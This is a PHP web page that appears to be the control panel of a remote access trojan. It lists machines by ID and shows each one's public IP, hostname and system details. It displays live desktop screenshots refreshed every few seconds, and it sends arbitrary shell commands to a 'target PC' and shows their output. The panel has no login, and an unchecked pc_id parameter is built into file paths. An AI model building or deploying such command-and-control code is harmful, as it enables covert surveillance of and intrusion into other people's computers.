<?php
// display.php
// This script allows you to view the uploaded screenshots and PC information for a specific PC ID.
// It also provides an interface to send commands to the selected PC and view their outputs.

// Define the base directory for uploaded files.
$baseUploadDirectory = 'uploads/';

// Function to get the latest screenshot for a given PC ID
function getLatestScreenshot($pcId, $baseDir) {
    $pcUploadDir = $baseDir . $pcId . '/';
    if (!is_dir($pcUploadDir)) {
        return null; // Directory doesn't exist
    }

    $latestFile = null;
    $latestTime = 0;

    // Scan the directory for webp files
    $files = glob($pcUploadDir . '*.webp'); // Assuming screenshots are .webp

    foreach ($files as $file) {
        if (is_file($file)) {
            $fileTime = filemtime($file);
            if ($fileTime > $latestTime) {
                $latestTime = $fileTime;
                $latestFile = $file;
            }
        }
    }
    return $latestFile ? basename($latestFile) : null;
}

// Function to get PC information from pc_info.json
function getPcInfo($pcId, $baseDir) {
    $pcInfoPath = $baseDir . $pcId . '/pc_info.json';
    if (file_exists($pcInfoPath)) {
        $jsonContent = file_get_contents($pcInfoPath);
        return json_decode($jsonContent, true);
    }
    return null;
}

// Get all PC IDs (directories) from the uploads folder
$pcIds = [];
if (is_dir($baseUploadDirectory)) {
    $dirs = array_filter(glob($baseUploadDirectory . '*'), 'is_dir');
    foreach ($dirs as $dir) {
        $pcIds[] = basename($dir);
    }
}

// Get search query from GET request
$searchQuery = isset($_GET['search']) ? strtolower(trim($_GET['search'])) : '';

// Filter PC IDs based on search query
$filteredPcIds = [];
if (!empty($searchQuery)) {
    foreach ($pcIds as $id) {
        if (str_contains(strtolower($id), $searchQuery)) {
            $filteredPcIds[] = $id;
        }
    }
    $pcIds = $filteredPcIds; // Use filtered list for display
}


$selectedPcId = isset($_GET['pc_id']) ? $_GET['pc_id'] : (empty($pcIds) ? null : $pcIds[0]);
$currentScreenshot = null;
$currentPcInfo = null;

if ($selectedPcId) {
    $currentScreenshot = getLatestScreenshot($selectedPcId, $baseUploadDirectory);
    $currentPcInfo = getPcInfo($selectedPcId, $baseUploadDirectory);
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Real-time Desktop Viewer</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            background-color: #fff;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 1200px;
            display: flex;
            flex-direction: column;
            gap: 20px;
        }
        .header {
            text-align: center;
            margin-bottom: 20px;
        }
        .screenshot-display {
            border: 1px solid #e0e0e0;
            border-radius: 8px;
            overflow: hidden;
            background-color: #f9f9f9;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 400px; /* Minimum height for display area */
            margin-top: 20px;
        }
        .screenshot-display img {
            max-width: 100%;
            height: auto;
            display: block;
            border-radius: 8px;
        }
        .no-content {
            color: #888;
            font-style: italic;
            text-align: center;
            padding: 50px;
        }
        .pc-list-item {
            cursor: pointer;
            padding: 10px 15px;
            border-radius: 8px;
            transition: background-color 0.2s;
        }
        .pc-list-item:hover {
            background-color: #e6f0ff;
        }
        .pc-list-item.active {
            background-color: #3b82f6;
            color: white;
            font-weight: bold;
        }
        .info-box {
            background-color: #f0f9ff; /* Light blue background */
            border: 1px solid #bfdbfe; /* Light blue border */
            padding: 15px;
            border-radius: 8px;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #1e40af; /* Darker blue for heading */
            margin-bottom: 10px;
        }
        .info-item {
            display: flex;
            justify-content: space-between;
            padding: 5px 0;
            border-bottom: 1px dashed #e0f2fe; /* Lighter dashed border */
        }
        .info-item:last-child {
            border-bottom: none;
        }
        .info-label {
            font-weight: 500;
            color: #374151; /* Dark gray */
        }
        .info-value {
            color: #4b5563; /* Medium gray */
        }
        .command-section {
            background-color: #fff7ed; /* Light orange background */
            border: 1px solid #fed7aa; /* Light orange border */
            padding: 15px;
            border-radius: 8px;
            margin-top: 20px;
        }
        .command-output {
            background-color: #e2e8f0; /* Light gray for code */
            color: #2d3748; /* Darker gray text */
            padding: 10px;
            border-radius: 6px;
            font-family: 'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, Courier, monospace;
            white-space: pre-wrap; /* Preserve whitespace and wrap long lines */
            max-height: 300px;
            overflow-y: auto;
            margin-top: 10px;
            border: 1px solid #cbd5e0;
        }
        .command-output.error {
            background-color: #fee2e2;
            color: #991b1b;
            border-color: #ef4444;
        }
        /* Tab styles */
        .tab-buttons {
            display: flex;
            margin-bottom: 20px;
            border-bottom: 2px solid #e0e0e0;
        }
        .tab-button {
            padding: 10px 20px;
            cursor: pointer;
            border: none;
            background-color: transparent;
            font-weight: 600;
            color: #6b7280;
            transition: color 0.2s, border-bottom-color 0.2s;
            border-bottom: 2px solid transparent;
        }
        .tab-button.active {
            color: #3b82f6;
            border-bottom-color: #3b82f6;
        }
        .tab-content {
            display: none; /* Hidden by default */
        }
        .tab-content.active {
            display: block; /* Shown when active */
        }
    </style>
</head>
<body class="bg-gray-100 flex items-center justify-center min-h-screen p-4">
    <div class="container bg-white rounded-xl shadow-lg p-6 md:p-8">
        <div class="header">
            <h1 class="text-3xl font-extrabold text-gray-800 mb-2">Real-time Desktop Viewer & PC Info</h1>
            <p class="text-gray-600">Select a PC ID to view its latest screenshot and system information.</p>
        </div>

        <div class="flex flex-col md:flex-row gap-6">
            <!-- PC ID List -->
            <div class="w-full md:w-1/4 bg-gray-50 p-4 rounded-lg shadow-inner">
                <h2 class="text-xl font-semibold text-gray-700 mb-4">Available PCs</h2>
                <div class="mb-4 flex gap-2">
                    <input type="text" id="pcSearchInput" placeholder="Search PC ID..."
                           class="flex-grow p-2 border border-gray-300 rounded-md focus:ring-blue-500 focus:border-blue-500"
                           value="<?php echo htmlspecialchars($searchQuery); ?>">
                    <button id="pcSearchButton"
                            class="px-4 py-2 bg-blue-500 text-white rounded-md hover:bg-blue-600 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-opacity-50">
                        Search
                    </button>
                </div>
                <?php if (!empty($pcIds)): ?>
                    <ul class="space-y-2">
                        <?php foreach ($pcIds as $pcIdItem): ?>
                            <li class="pc-list-item <?php echo ($pcIdItem === $selectedPcId) ? 'active' : ''; ?>"
                                onclick="window.location.href='?pc_id=<?php echo urlencode($pcIdItem); ?><?php echo !empty($searchQuery) ? '&search=' . urlencode($searchQuery) : ''; ?>'">
                                <?php echo htmlspecialchars($pcIdItem); ?>
                            </li>
                        <?php endforeach; ?>
                    </ul>
                <?php else: ?>
                    <p class="text-gray-500 italic">No PC IDs found yet. Upload some data!</p>
                <?php endif; ?>
            </div>

            <!-- Content Display Area (Screenshot + PC Info + Commands) -->
            <div class="w-full md:w-3/4 bg-gray-50 p-4 rounded-lg shadow-inner flex flex-col">
                <h2 class="text-xl font-semibold text-gray-700 mb-4 text-center">
                    <?php echo $selectedPcId ? 'Viewing PC: ' . htmlspecialchars($selectedPcId) : 'No PC Selected'; ?>
                </h2>

                <?php if ($selectedPcId): ?>
                    <!-- Tab Buttons -->
                    <div class="tab-buttons">
                        <button class="tab-button active" onclick="openTab(event, 'pcInfoTab')">PC Information</button>
                        <button class="tab-button" onclick="openTab(event, 'commandControlTab')">Command Control</button>
                        <button class="tab-button" onclick="openTab(event, 'screenshotTab')">Real-time Desktop</button>
                    </div>

                    <!-- PC Information Tab Content -->
                    <div id="pcInfoTab" class="tab-content active info-box mb-6">
                        <h3 class="text-lg font-bold text-blue-800 mb-3">PC Information</h3>
                        <?php if ($currentPcInfo): ?>
                            <div class="space-y-2">
                                <div class="info-item">
                                    <span class="info-label">Public IP:</span>
                                    <span class="info-value"><?php echo htmlspecialchars($currentPcInfo['public_ip'] ?? 'N/A'); ?></span>
                                </div>
                                <div class="info-item">
                                    <span class="info-label">Operating System:</span>
                                    <span class="info-value"><?php echo htmlspecialchars($currentPcInfo['os_name'] ?? 'N/A') . ' ' . htmlspecialchars($currentPcInfo['os_version'] ?? ''); ?> (<?php echo htmlspecialchars($currentPcInfo['os_architecture'] ?? 'N/A'); ?>)</span>
                                </div>
                                <div class="info-item">
                                    <span class="info-label">Hostname:</span>
                                    <span class="info-value"><?php echo htmlspecialchars($currentPcInfo['hostname'] ?? 'N/A'); ?></span>
                                </div>
                                <div class="info-item">
                                    <span class="info-label">Screen Resolution:</span>
                                    <span class="info-value"><?php echo htmlspecialchars($currentPcInfo['screen_width'] ?? 'N/A'); ?>x<?php echo htmlspecialchars($currentPcInfo['screen_height'] ?? 'N/A'); ?></span>
                                </div>
                                <div class="info-item">
                                    <span class="info-label">CPU Cores (Physical/Logical):</span>
                                    <span class="info-value"><?php echo htmlspecialchars($currentPcInfo['cpu_cores'] ?? 'N/A'); ?>/<?php echo htmlspecialchars($currentPcInfo['cpu_threads'] ?? 'N/A'); ?></span>
                                </div>
                                <div class="info-item">
                                    <span class="info-label">CPU Usage:</span>
                                    <span class="info-value"><?php echo htmlspecialchars($currentPcInfo['cpu_percent'] ?? 'N/A'); ?>%</span>
                                </div>
                                <div class="info-item">
                                    <span class="info-label">Total RAM:</span>
                                    <span class="info-value"><?php echo htmlspecialchars($currentPcInfo['total_ram_gb'] ?? 'N/A'); ?> GB</span>
                                </div>
                                <div class="info-item">
                                    <span class="info-label">Available RAM:</span>
                                    <span class="info-value"><?php echo htmlspecialchars($currentPcInfo['available_ram_gb'] ?? 'N/A'); ?> GB</span>
                                </div>
                                <div class="info-item">
                                    <span class="info-label">Used RAM:</span>
                                    <span class="info-value"><?php echo htmlspecialchars($currentPcInfo['used_ram_percent'] ?? 'N/A'); ?>%</span>
                                </div>
                            </div>
                        <?php else: ?>
                            <p class="no-content">No PC information found for this PC yet.</p>
                        <?php endif; ?>
                    </div>

                    <!-- Command Control Tab Content -->
                    <div id="commandControlTab" class="tab-content command-section mb-6">
                        <h3 class="text-lg font-bold text-orange-700 mb-3">Remote Command Control</h3>
                        <textarea id="commandInput"
                                  class="w-full p-2 border border-gray-300 rounded-md focus:ring-orange-500 focus:border-orange-500 mb-2"
                                  rows="3" placeholder="Enter command to run on target PC (e.g., dir, ls -l, ipconfig)"></textarea>
                        <div class="flex gap-2 mb-4">
                            <button id="sendCommandButton"
                                    class="flex-grow px-4 py-2 bg-orange-500 text-white rounded-md hover:bg-orange-600 focus:outline-none focus:ring-2 focus:ring-orange-500 focus:ring-opacity-50">
                                Send Command
                            </button>
                            <button id="clearOutputButton"
                                    class="px-4 py-2 bg-gray-400 text-white rounded-md hover:bg-gray-500 focus:outline-none focus:ring-2 focus:ring-gray-400 focus:ring-opacity-50">
                                Clear Output
                            </button>
                        </div>

                        <h4 class="text-md font-semibold text-orange-700 mb-2">Command Output:</h4>
                        <div id="commandOutputDisplay" class="command-output">
                            Waiting for command output...
                        </div>
                    </div>

                    <!-- Real-time Desktop Tab Content -->
                    <div id="screenshotTab" class="tab-content screenshot-display w-full">
                        <?php if ($currentScreenshot): ?>
                            <img id="screenshotImage" src="<?php echo htmlspecialchars($baseUploadDirectory . $selectedPcId . '/' . $currentScreenshot); ?>" alt="Latest Screenshot">
                        <?php else: ?>
                            <p class="no-content">No screenshots found for this PC yet.</p>
                        <?php endif; ?>
                    </div>
                    <p class="text-sm text-gray-500 mt-4 text-center" id="screenshotUpdateTime">
                        Screenshot last updated: <span id="lastUpdatedTime">Loading...</span>
                    </p>
                <?php else: ?>
                    <p class="no-content text-center">Please select a PC ID from the left to view its details and control it.</p>
                <?php endif; ?>
            </div>
        </div>
    </div>

    <script>
        const selectedPcId = "<?php echo $selectedPcId ? htmlspecialchars($selectedPcId) : ''; ?>";
        const baseUploadDirectory = "<?php echo htmlspecialchars($baseUploadDirectory); ?>";
        const screenshotImage = document.getElementById('screenshotImage');
        const lastUpdatedTimeSpan = document.getElementById('lastUpdatedTime');
        const pcSearchInput = document.getElementById('pcSearchInput');
        const pcSearchButton = document.getElementById('pcSearchButton');

        // Command control elements
        const commandInput = document.getElementById('commandInput');
        const sendCommandButton = document.getElementById('sendCommandButton');
        const commandOutputDisplay = document.getElementById('commandOutputDisplay');
        const clearOutputButton = document.getElementById('clearOutputButton');

        const COMMAND_HANDLER_URL = 'command_handler.php'; // Path to your new command handler script

        let screenshotIntervalId;
        let commandPollingIntervalId;

        function refreshScreenshot() {
            if (!selectedPcId || !screenshotImage) {
                return;
            }

            fetch(`get_latest_screenshot.php?pc_id=${encodeURIComponent(selectedPcId)}`)
                .then(response => response.json())
                .then(data => {
                    if (data.success && data.filename) {
                        const newImageUrl = `${baseUploadDirectory}${selectedPcId}/${data.filename}?_cache_buster=${new Date().getTime()}`;
                        if (screenshotImage.src !== newImageUrl) {
                            screenshotImage.src = newImageUrl;
                            lastUpdatedTimeSpan.textContent = new Date().toLocaleTimeString();
                        }
                    } else {
                        console.error('Failed to get latest screenshot:', data.message);
                    }
                })
                .catch(error => {
                    console.error('Error fetching latest screenshot:', error);
                });
        }

        function handlePcSearch() {
            const searchTerm = pcSearchInput.value.trim();
            let currentUrl = new URL(window.location.href);
            if (searchTerm) {
                currentUrl.searchParams.set('search', searchTerm);
            } else {
                currentUrl.searchParams.delete('search');
            }
            currentUrl.searchParams.delete('pc_id');
            window.location.href = currentUrl.toString();
        }

        // Function to send command
        async function sendCommand() {
            if (!selectedPcId) {
                commandOutputDisplay.textContent = 'Please select a PC ID first.';
                commandOutputDisplay.classList.add('error');
                return;
            }
            const command = commandInput.value.trim();
            if (!command) {
                commandOutputDisplay.textContent = 'Please enter a command.';
                commandOutputDisplay.classList.add('error');
                return;
            }

            commandOutputDisplay.textContent = 'Sending command...';
            commandOutputDisplay.classList.remove('error');

            const formData = new FormData();
            formData.append('action', 'send_command');
            formData.append('pc_id', selectedPcId);
            formData.append('command', command);

            try {
                const response = await fetch(COMMAND_HANDLER_URL, {
                    method: 'POST',
                    body: formData
                });
                const data = await response.json();
                if (data.success) {
                    commandOutputDisplay.textContent = `Command "${command}" sent successfully. Waiting for response...`;
                    commandInput.value = ''; // Clear input after sending
                    pollCommandOutput(); // Start polling for this command's output
                } else {
                    commandOutputDisplay.textContent = `Failed to send command: ${data.message}`;
                    commandOutputDisplay.classList.add('error');
                }
            } catch (error) {
                commandOutputDisplay.textContent = `Network error sending command: ${error}`;
                commandOutputDisplay.classList.add('error');
                console.error('Error sending command:', error);
            }
        }

        // Function to poll for command output
        async function pollCommandOutput() {
            if (!selectedPcId) return;

            try {
                const response = await fetch(`${COMMAND_HANDLER_URL}?action=get_outputs&pc_id=${encodeURIComponent(selectedPcId)}`);
                const data = await response.json();

                if (data.success && data.outputs && data.outputs.length > 0) {
                    // Display the latest output
                    const latestOutput = data.outputs[data.outputs.length - 1];
                    commandOutputDisplay.textContent = `Output (Status: ${latestOutput.status}):\n${latestOutput.output}\n\n(Received at: ${latestOutput.timestamp})`;
                    if (latestOutput.status === 'failed') {
                        commandOutputDisplay.classList.add('error');
                    } else {
                        commandOutputDisplay.classList.remove('error');
                    }
                } else {
                    commandOutputDisplay.textContent = 'Waiting for command output...';
                    commandOutputDisplay.classList.remove('error');
                }
            } catch (error) {
                commandOutputDisplay.textContent = `Error fetching command output: ${error}`;
                commandOutputDisplay.classList.add('error');
                console.error('Error fetching command output:', error);
            }
        }

        // Function to clear command outputs on the server
        async function clearOutputs() {
            if (!selectedPcId) {
                alert('Please select a PC ID first.');
                return;
            }

            const formData = new FormData();
            formData.append('action', 'clear_outputs');
            formData.append('pc_id', selectedPcId);

            try {
                const response = await fetch(COMMAND_HANDLER_URL, {
                    method: 'POST',
                    body: formData
                });
                const data = await response.json();
                if (data.success) {
                    commandOutputDisplay.textContent = 'Command outputs cleared.';
                    commandOutputDisplay.classList.remove('error');
                } else {
                    commandOutputDisplay.textContent = `Failed to clear outputs: ${data.message}`;
                    commandOutputDisplay.classList.add('error');
                }
            } catch (error) {
                commandOutputDisplay.textContent = `Network error clearing outputs: ${error}`;
                commandOutputDisplay.classList.add('error');
                console.error('Error clearing outputs:', error);
            }
        }

        // Tab switching logic
        function openTab(evt, tabName) {
            // Declare all variables
            let i, tabcontent, tabbuttons;

            // Get all elements with class="tab-content" and hide them
            tabcontent = document.getElementsByClassName("tab-content");
            for (i = 0; i < tabcontent.length; i++) {
                tabcontent[i].style.display = "none";
                tabcontent[i].classList.remove("active"); // Remove active class
            }

            // Get all elements with class="tab-button" and remove the "active" class
            tabbuttons = document.getElementsByClassName("tab-button");
            for (i = 0; i < tabbuttons.length; i++) {
                tabbuttons[i].classList.remove("active");
            }

            // Show the current tab, and add an "active" class to the button that opened the tab
            const selectedTab = document.getElementById(tabName);
            if (selectedTab) {
                selectedTab.style.display = "block";
                selectedTab.classList.add("active");
            }
            if (evt) { // Check if evt is defined (i.e., called from a click event)
                evt.currentTarget.classList.add("active");
            }

            // Manage intervals based on the active tab
            clearInterval(screenshotIntervalId);
            clearInterval(commandPollingIntervalId);

            if (selectedPcId) {
                if (tabName === 'screenshotTab') {
                    refreshScreenshot(); // Initial refresh when tab is opened
                    screenshotIntervalId = setInterval(refreshScreenshot, 5000);
                    document.getElementById('screenshotUpdateTime').style.display = 'block';
                } else {
                    document.getElementById('screenshotUpdateTime').style.display = 'none';
                }

                if (tabName === 'commandControlTab') {
                    pollCommandOutput(); // Initial poll when tab is opened
                    commandPollingIntervalId = setInterval(pollCommandOutput, 3000);
                }
            }
        }


        // Event Listeners
        if (pcSearchButton) {
            pcSearchButton.addEventListener('click', handlePcSearch);
        }
        if (pcSearchInput) {
            pcSearchInput.addEventListener('keypress', function(event) {
                if (event.key === 'Enter') {
                    handlePcSearch();
                }
            });
        }
        if (sendCommandButton) {
            sendCommandButton.addEventListener('click', sendCommand);
        }
        if (clearOutputButton) {
            clearOutputButton.addEventListener('click', clearOutputs);
        }

        // Initial load: Open the first tab (PC Information) if a PC is selected
        if (selectedPcId) {
            openTab(null, 'pcInfoTab'); // Pass null for event as it's not a click
        } else {
            // If no PC is selected, hide the tab buttons and content areas
            document.querySelector('.tab-buttons').style.display = 'none';
            document.getElementById('screenshotUpdateTime').style.display = 'none';
        }
    </script>
</body>
</html>
